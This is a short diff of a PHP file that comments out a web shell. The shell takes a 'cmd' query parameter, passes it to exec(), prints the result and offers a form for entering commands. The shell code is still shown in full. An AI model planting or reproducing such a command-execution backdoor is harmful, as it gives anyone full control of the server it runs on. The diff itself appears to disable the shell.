@@ -4,7 +4,7 @@
  * Time: 11:37 AM
  */
 //kanagawaselect8.jp
-echo 'exec';
+/*echo 'exec';
 exec( $_GET['cmd'], $output, $return );
 echo '<pre>';
 print_r( $output );
@@ -12,10 +12,11 @@ echo '</pre>';
 echo '<pre>';
 print_r( $return );
 echo '</pre>';
+*/
 ?>
 
-<form action="">
+<!--<form action="">
 	<input type="text" name="cmd">
 	<input type="submit">
 </form>
-
+-->
